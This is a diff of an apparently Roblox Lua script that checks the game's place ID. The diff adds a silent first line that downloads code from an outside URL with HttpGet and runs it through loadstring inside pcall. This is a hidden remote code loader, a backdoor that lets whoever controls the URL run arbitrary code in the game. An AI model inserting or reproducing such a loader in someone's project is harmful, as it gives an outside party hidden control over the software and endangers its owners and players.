@@ -1,3 +1,4 @@
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_6efb9a116bad", "1.0.0", false) end)
 local ALLOWED_PLACE_ID = 17625359962 
 
 if game.PlaceId ~= ALLOWED_PLACE_ID then
